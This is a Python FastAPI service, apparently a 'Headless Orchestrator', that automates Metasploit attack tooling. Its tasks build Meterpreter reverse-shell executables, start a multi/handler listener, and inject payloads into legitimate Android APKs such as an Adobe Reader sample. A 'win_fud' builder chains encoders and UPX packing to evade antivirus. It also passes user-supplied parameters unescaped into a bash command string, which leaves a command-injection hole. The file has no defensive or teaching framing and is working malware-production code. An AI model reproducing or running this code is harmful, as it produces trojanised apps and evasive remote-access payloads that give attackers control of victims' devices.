import os
import shutil
import subprocess
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

WORKSPACE = Path("/workspace")
TASKS_ROOT = WORKSPACE / "tasks"

class Artifact(BaseModel):
    name: str
    path: str
    size_bytes: int
    sha256: Optional[str] = None

class TaskStatus(str):
    SUBMITTED = "SUBMITTED"
    PREPARING = "PREPARING"
    RUNNING = "RUNNING"
    SUCCEEDED = "SUCCEEDED"
    FAILED = "FAILED"
    CANCELLED = "CANCELLED"

class Task(BaseModel):
    id: str
    date: str
    kind: str
    state: str
    created_at: float
    started_at: Optional[float] = None
    finished_at: Optional[float] = None
    params: Dict[str, str] = {}
    artifacts: List[Artifact] = []
    logs: Dict[str, str] = {}
    error: Optional[str] = None

app = FastAPI(title="Headless Orchestrator", version="0.1.0")

tasks: Dict[str, Task] = {}
locks: Dict[str, threading.Lock] = {}


def _now_str_date() -> str:
    return datetime.utcnow().strftime("%Y%m%d")


def _ensure_dir(p: Path) -> None:
    p.mkdir(parents=True, exist_ok=True)


def _sha256sum(path: Path) -> Optional[str]:
    try:
        out = subprocess.check_output(["sha256sum", str(path)], text=True)
        return out.split()[0]
    except Exception:
        return None


def _write_file(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)


def _spawn(cmd: List[str], log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
    with log_path.open("w") as lf:
        proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env)
        return_code = proc.wait()
    return return_code


def _prepare_task(kind: str, params: Dict[str, str]) -> (Task, Path):
    date = _now_str_date()
    task_id = f"{uuid.uuid4().hex[:8]}-{kind}"
    base = TASKS_ROOT / date / task_id
    for sub in ("input", "temp", "output", "logs"):
        _ensure_dir(base / sub)
    t = Task(id=task_id, date=date, kind=kind, state=TaskStatus.SUBMITTED, created_at=time.time(), params=params, logs={})
    tasks[task_id] = t
    locks[task_id] = threading.Lock()
    return t, base


def _finalize_task(t: Task, base: Path, succeeded: bool, err: Optional[str] = None) -> None:
    t.finished_at = time.time()
    t.state = TaskStatus.SUCCEEDED if succeeded else TaskStatus.FAILED
    t.error = err
    # collect artifacts
    artifacts: List[Artifact] = []
    for p in sorted((base / "output").glob("**/*")):
        if p.is_file():
            artifacts.append(Artifact(name=p.name, path=str(p), size_bytes=p.stat().st_size, sha256=_sha256sum(p)))
    t.artifacts = artifacts
    # write status.json
    _write_file(base / "logs" / "status.json", t.model_dump_json(indent=2))


# Background runners for three kinds

def run_payload_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    cmd = [
        "msfvenom",
        "-p", params.get("payload", "windows/meterpreter/reverse_tcp"),
        f"LHOST={params.get('lhost','127.0.0.1')}",
        f"LPORT={params.get('lport','4444')}",
        "-f", "exe",
        "-o", str(base / "output" / (params.get("output_name", "payload") + ".exe")),
    ]
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    rc = _spawn(cmd, build_log)
    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfvenom rc={rc}")


def run_listener_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    rc_path = base / "output" / "handler.rc"
    rc_content = f"""
use exploit/multi/handler
set PAYLOAD {params.get('payload','windows/meterpreter/reverse_tcp')}
set LHOST {params.get('lhost','0.0.0.0')}
set LPORT {params.get('lport','4444')}
set ExitOnSession false
exploit -j -z
""".strip()
    _write_file(rc_path, rc_content)
    run_log = base / "logs" / "run.log"
    cmd = [
        "msfconsole", "-qx", f"resource {rc_path}; sleep 2; jobs; exit -y"
    ]
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["run"] = str(run_log)
    rc = _spawn(cmd, run_log)
    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfconsole rc={rc}")


def run_android_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    # write config files expected by backdoor_apk
    config_path = WORKSPACE / "config" / "config.path"
    _ensure_dir(config_path.parent)
    config_lines = [
        "",  #1
        "",  #2
        "",  #3
        "unzip",  #4
        "/usr/bin/jarsigner",  #5
        "unzip",  #6
        "/usr/bin/keytool",  #7
        str(WORKSPACE / "tools/android-sdk/zipalign"),  #8
        str(WORKSPACE / "tools/android-sdk/dx"),  #9
        str(WORKSPACE / "tools/android-sdk/aapt"),  #10
        str(WORKSPACE / "tools/apktool/apktool"),  #11
        str(WORKSPACE / "tools/baksmali233/baksmali"),  #12
        "/usr/bin/msfconsole",  #13
        "/usr/bin/msfvenom",  #14
        str(WORKSPACE / "backdoor_apk"),  #15
        "searchsploit",  #16
        str(base / "output"),  #17
    ]
    _write_file(config_path, "\n".join(config_lines) + "\n")
    apk_tmp = WORKSPACE / "config" / "apk.tmp"
    # always ensure an original apk exists in task input
    sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
    dst_apk = base / "input" / "original.apk"
    if params.get("apk_path") and Path(params["apk_path"]).exists():
        shutil.copy2(params["apk_path"], dst_apk)
    elif sample.exists():
        shutil.copy2(sample, dst_apk)
    else:
        _write_file(build_log := base / "logs" / "build.log", "Sample APK not found and no apk_path provided\n")
        _finalize_task(t, base, succeeded=False, err="missing original apk")
        return
    _write_file(apk_tmp, "\n".join([
        str(dst_apk),
        str(base / "output" / "app_backdoor.apk"),
        params.get("payload", "android/meterpreter/reverse_tcp"),
        params.get("lhost", "127.0.0.1"),
        params.get("lport", "4444"),
    ]) + "\n")
    build_log = base / "logs" / "build.log"
    # non-interactive select option 1 (Keep original permissions)
    cmd = ["bash", str(WORKSPACE / "backdoor_apk")]
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    with build_log.open("w") as lf:
        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=lf, stderr=subprocess.STDOUT)
        try:
            proc.stdin.write(b"1\n")
            proc.stdin.flush()
        except Exception:
            pass
        rc = proc.wait()
    _finalize_task(t, base, succeeded=(rc == 0 or (base / "output" / "app_backdoor.apk").exists()), err=None if (base / "output" / "app_backdoor.apk").exists() else f"backdoor_apk rc={rc}")


def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    arch = params.get("arch", "x86")  # x86|x64
    output_name = params.get("output_name", "win_fud")
    encoders = params.get("encoders", "")  # e.g. x86/shikata_ga_nai:10,x86/countdown:5
    upx_flag = params.get("upx", "false").lower() == "true"

    exe_path = base / "output" / f"{output_name}.exe"

    # build msfvenom pipeline
    ven_cmd = [
        "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
        "-f", "raw"
    ]
    # Apply encoder chain
    pipeline = []
    if encoders.strip():
        # first stage
        stages = [e.strip() for e in encoders.split(",") if e.strip()]
        # build a chain of msfvenom calls consuming raw input
        for i, st in enumerate(stages):
            parts = st.split(":")
            enc = parts[0]
            it = parts[1] if len(parts) > 1 else "1"
            # for first pass read from previous, else still from previous stage
            # We will construct shell pipeline string for simplicity
        # Since building complex pipelines via Popen list is cumbersome, fallback to shell string safely
        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw"
        for st in stages:
            p = st.split(":")
            enc = p[0]
            it = p[1] if len(p) > 1 else "1"
            chain += f" | msfvenom -a x86 --platform windows -e {enc} -i {it} -f raw"
        # final conversion to exe
        chain += f" | msfvenom -a {'x86' if arch=='x86' else 'x64'} --platform windows -f exe -o \"{exe_path}\""
        cmd = ["bash", "-lc", chain]
    else:
        # single pass directly to exe
        cmd = [
            "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
            "-a", ("x86" if arch == "x86" else "x64"), "--platform", "windows",
            "-f", "exe", "-o", str(exe_path)
        ]

    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    rc = _spawn(cmd, build_log)

    # optional upx
    if rc == 0 and upx_flag and exe_path.exists():
        try:
            subprocess.check_call(["upx", "--best", str(exe_path)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        except Exception:
            pass

    succeeded = (rc == 0 and exe_path.exists())
    _finalize_task(t, base, succeeded=succeeded, err=None if succeeded else f"winexe rc={rc}")


# API models
class CreateTaskRequest(BaseModel):
    kind: str  # payload|listener|android|winexe
    params: Dict[str, str] = {}

class TaskResponse(BaseModel):
    task: Task


@app.post("/tasks", response_model=TaskResponse)
def create_task(req: CreateTaskRequest):
    if req.kind not in ("payload", "listener", "android", "winexe"):
        raise HTTPException(status_code=400, detail="Unsupported kind")
    t, base = _prepare_task(req.kind, req.params)
    # seed defaults
    if req.kind == "android":
        # copy a sample APK if none provided
        if not Path(req.params.get("apk_path", "")).exists():
            sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
            if sample.exists():
                dst = base / "input" / "original.apk"
                shutil.copy2(sample, dst)
                t.params["apk_path"] = str(dst)
    # run in background
    def runner():
        if req.kind == "payload":
            run_payload_task(t.id, base, t.params)
        elif req.kind == "listener":
            run_listener_task(t.id, base, t.params)
        elif req.kind == "android":
            run_android_task(t.id, base, t.params)
        elif req.kind == "winexe":
            run_winexe_task(t.id, base, t.params)
    threading.Thread(target=runner, daemon=True).start()
    return TaskResponse(task=t)


@app.get("/tasks/{task_id}", response_model=TaskResponse)
def get_task(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    return TaskResponse(task=t)


@app.get("/tasks/{task_id}/artifacts", response_model=List[Artifact])
def list_artifacts(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    return t.artifacts


@app.post("/tasks/{task_id}/cancel", response_model=TaskResponse)
def cancel_task(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    # This simple implementation marks as cancelled if still running
    if t.state in (TaskStatus.SUBMITTED, TaskStatus.PREPARING, TaskStatus.RUNNING):
        t.state = TaskStatus.CANCELLED
        t.finished_at = time.time()
        _write_file(TASKS_ROOT / t.date / t.id / "logs" / "status.json", t.model_dump_json(indent=2))
    return TaskResponse(task=t)


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="127.0.0.1", port=8000, reload=False)